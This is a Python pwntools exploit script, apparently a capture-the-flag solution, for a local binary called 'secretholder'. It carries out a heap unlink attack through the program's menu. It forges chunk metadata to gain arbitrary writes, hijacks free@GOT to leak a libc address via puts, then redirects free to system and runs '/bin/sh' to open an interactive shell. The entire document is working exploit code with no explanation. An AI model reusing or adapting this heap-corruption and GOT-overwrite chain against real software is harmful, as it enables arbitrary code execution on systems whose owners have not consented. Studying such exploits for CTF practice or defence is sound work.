from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./secretholder"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin = ELF(file)

conn = process(file)
#gdb.attach(conn)

def keep(level, secret):
    conn.recvuntil("Renew secret");
    conn.sendline("1")
    conn.recvuntil("Huge secret")
    conn.sendline(str(level))
    conn.recvuntil("your secret: ")
    conn.send(secret)

def wipe(level):
    conn.recvuntil("Renew secret");
    conn.sendline("2")
    conn.recvuntil("Huge secret")
    conn.sendline(str(level))

def renew(level, secret):
    conn.recvuntil("Renew secret");
    conn.sendline("3")
    conn.recvuntil("Huge secret")
    conn.sendline(str(level))
    conn.recvuntil("secret: ")
    conn.send(secret)

keep(1, "aa")
wipe(1)
keep(2, "aa")
wipe(1)
keep(1, "aa")

# Trick to create huge chunk on heap and not mmaped
keep(3, "aa")
wipe(3)
keep(3, "aa")

small_ptr = 0x6020B0
big_ptr = 0x6020A0
huge_ptr = 0x6020A8

payload = p64(0) # Prev size
payload += p64(0x20) # Size
payload += p64(small_ptr - 3*8) # fd
payload += p64(small_ptr - 2*8) # bck

payload = payload.ljust(0x20, "\x00")
payload += p64(0x20) # Previous Size
payload += p64(0x61a90) # Size

renew(2, payload)
wipe(3)

def a_write(addr, data):
    payload = p64(0) + p64(addr)
    renew(1, payload)
    renew(2, data)

a_write(bin.got['free'], p64(bin.symbols['puts']))

renew(1, p64(0) + p64(0) + p64(bin.got['puts']))
wipe(3)
conn.recvn(1)
puts_addr = u64(conn.recvn(6) + "\x00\x00")
system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr

a_write(bin.got['free'], p64(system_addr))
renew(1, "/bin/sh\x00")
wipe(1)

print(hex(puts_addr))
print(hex(system_addr))

conn.interactive()
